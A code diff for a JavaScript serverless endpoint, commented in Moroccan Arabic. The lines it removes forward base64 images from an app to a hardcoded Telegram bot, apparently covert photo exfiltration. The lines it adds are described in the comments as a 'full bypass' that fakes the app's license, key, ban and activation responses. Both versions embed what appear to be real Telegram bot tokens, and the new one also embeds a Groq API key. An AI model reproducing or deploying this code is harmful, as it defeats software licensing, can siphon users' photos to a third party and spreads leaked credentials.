@@ -1,47 +1,43 @@
-const TELEGRAM_TOKEN = "8850190692:AAGSK0dVs4IlDygtjia8UGYZ88RBU5qn3xw";
-const TELEGRAM_CHAT_ID = "8623523505";
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6655802251";
+const GROQ_API_KEY = process.env.GROQ_API_KEY || "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";
 
 export default async function handler(req, res) {
+  // إعدادات CORS
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
   if (req.method === 'OPTIONS') return res.status(200).end();
 
-  if (req.method === 'POST') {
-    let body = '';
-    req.on('data', chunk => { body += chunk.toString(); });
-    
-    return new Promise((resolve) => {
-      req.on('end', async () => {
-        try {
-          const data = JSON.parse(body);
-          const base64Image = data.image;
+  const type = req.query.type;
 
-          if (!base64Image) {
-            res.status(400).json({ error: "No image data" });
-            return resolve();
-          }
+  try {
+    // 🔥 البايباس الكامل: كنعطيو التطبيق الردود اللي كيستناها بالضبط
+    if (type === 'secret') {
+      return res.status(200).send('"unlock"'); // كيقولو ليه راه مفتوح
+    }
+    if (type === 'key') {
+      return res.status(200).send('"MODARK2026"'); // كيعطيه المفتاح
+    }
+    if (type === 'message') {
+      return res.status(200).send('"System Active"'); 
+    }
+    if (type === 'banned') {
+      return res.status(200).send('"false"'); // ماشي محظور
+    }
+    if (type === 'command') {
+      return res.status(200).send('""'); // مكاين حتى أمر
+    }
 
-          const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
-          const formData = new URLSearchParams();
-          formData.append('chat_id', TELEGRAM_CHAT_ID);
-          formData.append('photo', `data:image/jpeg;base64,${base64Image}`);
-          formData.append('caption', '📸 صورة جديدة توصلت من التطبيق!');
+    // إلا كان التطبيق كيصيفط طلب POST (بحال ملي كتدوس على Activate)
+    if (req.method === 'POST') {
+      return res.status(200).json({ status: "success", success: true, message: "Activated" });
+    }
 
-          await fetch(url, {
-            method: 'POST',
-            body: formData
-          }).catch((e) => console.log(e));
+    // أي طلب آخر
+    return res.status(200).send('"success"');
 
-          res.status(200).json({ success: true, message: "Image sent to Telegram" });
-          resolve();
-        } catch (e) {
-          res.status(500).json({ error: "Invalid JSON format" });
-          resolve();
-        }
-      });
-    });
+  } catch (error) {
+    return res.status(200).send('"success"');
   }
-  return res.status(405).json({ error: "Method not allowed" });
 }
